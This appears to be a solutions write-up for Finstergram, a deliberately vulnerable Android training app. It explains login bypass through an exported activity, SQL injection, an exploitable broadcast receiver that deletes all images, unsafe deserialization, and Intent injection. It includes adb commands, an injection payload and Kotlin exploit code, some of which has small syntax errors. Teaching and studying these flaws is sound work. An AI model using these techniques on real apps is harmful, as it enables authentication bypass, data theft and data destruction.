<h2>Solutions</h2>

Spoiler Alert! Here you can find a description of Finstergram's security vulnerabilities and how
they can be exploited.

## Exported ImageListActivity

The "android:exported" property in the AndroidManifest section of an Activity determines whether
it can be started by other apps. In some cases this is necessary, for example when you want users
to be able to share a file from another app with your application.
Finstergram's ImageListActivity however, should not be exported as this allows an attacker to launch
it directly (via another app or adb), skipping over the LoginActivity:

> adb shell am start -n com.netlight.sec.finstergram/com.netlight.sec.finstergram.ui.list.ImageListActivity

## SQL Injection in DatabaseHelper

In the "authenticateUser" function of DatabaseHelper, the entered name and password are directly
built into the query string. As a result, the query can be changed by providing an especially forged
name or password. As an attacker we only need to produce a query which returns at least one row so
that the "authenticateUser" will return true in the end. This can be achieved, e.g., by entering
"user" as the name and "' OR 1==1 --" as the password.

The resulting query will be:
> SELECT * FROM users WHERE username='user' AND password='' OR 1 == 1 --''

The modified query will simply return all rows. Note that "--" starts a comment in SQL, as a result
character after this sequence will be ignored.

## Exported BroadcastReceiver, sendBroadcast with implicit Intent 

ImageStoreService registers a BroadcastReceiver at runtime. As the "registerReceiver" call does not
specify whether the BroadcastReceiver is exported, it defaults to exported. As a result, any app can
send messages to it and, for example, trigger the background action to delete all images:

> adb shell am broadcast -a INTENT_ACTION_FINSTERGRAM_IMG_SERVICE --es INTENT_EXTRA_COMMAND DELETE_ALL

On top of that, the ImageStore sends messages to the BroadcastReceiver with an implicit Intent,
meaning it only specifies an Intent action, not exactly which app component should receive the
Intent. A malicious app could simply register a BroadcastReceiver for the same Intent action and
would be notified about which images are imported into Finstergram's gallery.

## Deserialization vulnerability in SharedImageActivity

The "MetadataOptions" functionality which allows a calling app of SharedImageActivity to pass one of
a set of options is vulnerable as it allows an attacker to deserialize an object of an arbitrary
class i.e. an attacker can instantiate an object of an arbitrary class. Whether such a vulnerability
can be exploited depends on which classes are available on the victim app's classpath and what they
do on initialization.
In the case of Finstergram, UserSettings objects will set themselves as the
current UserSettings instance after they are initialized. An attacker can exploit this by making
Finstergram deserialize a UserSettings object with "requirePassword" set to false.

Example exploit code which would run in an attacker app:
  ```
  private fun exploitDeserializationVulnerability {
    val finstergramPackage = "com.netlight.sec.finstergram"
    val targetActivityName = "${finstergramPackage}.ui.shared.SharedImageActivity"
    val irrelevantFakeUri =
      Uri.parse("content://com.netlight.sec.finstergram.imageprovider/images/image.jpg'
    val optionType = "com.netlight.sec.finstergram.data.UserSettings"
    val option = "{\"requirePassword\": false, \"darkMode\": true}"
    val intent = Intent().apply {
      putExtra(Intent.EXTRA_STREAM, irrelevantFakeUri)
      putExtra("INTENT_EXTRA_IMG_METADATA_OPTION_TYPE", optionType)
      putExtra("INTENT_EXTRA_IMG_METADATA_OPTION", option)
      setClassName(finstergramPackage, targetActivityName)
    }
    startActivityForResult(intent, 0)
  }
  ```

## Intent injection in SharedImageActivity

An Intent injection vulnerability is a situation where a malicious app can trick another app into
sending a forged Intent. Among other reasons, this is dangerous as Intents are used to grant access
to content stored in ContentProviders: when an app wants to grant access to another app, it sends
an Intent with a Uri pointing to the content which should be shared and applies specific flags, for
instance Intent.FLAG_GRANT_READ_URI_PERMISSION to grant read access.
Finstergram's SharedImageActivity returns incoming Intents to calling apps, after processing them in
onResume, by calling setResult(..., intent) which is a common anti-pattern. The Android OS will
interpret this as Finstergram sending the Intent to the calling app, leading to an Intent injection
vulnerability.

To exploit this, an attacker prepares an Intent with a Uri pointing to an image within Finstergram
and the Intent.FLAG_GRANT_READ_URI_PERMISSION flag set. This Intent is then sent to 
SharedImageActivity, which will duly send it back with setResult. In onActivityResult, the attacker
app can then use the returned Intent to access the secret image.
  ```
  private fun exploitIntentInjection() {
    val finstergramPackage = "com.netlight.sec.finstergram"
    val targetActivityName = "${finstergramPackage}.ui.shared.SharedImageActivity"
    val targetImage = "content://com.netlight.sec.finstergram.imageprovider/images/image.jpg"
    val intent = Intent().apply {
      data = Uri.parse(targetImage)
      flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
      setClassName(finstergramPackage, targetActivityName)
    }
    startActivityForResult(intent, 0)
  }

  override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
    super.onActivityResult(requestCode, resultCode, data)
    contentResolver.openInputStream(data!!).use { inputStream
      // image can be now read from inputStream!
    }
  }
  ```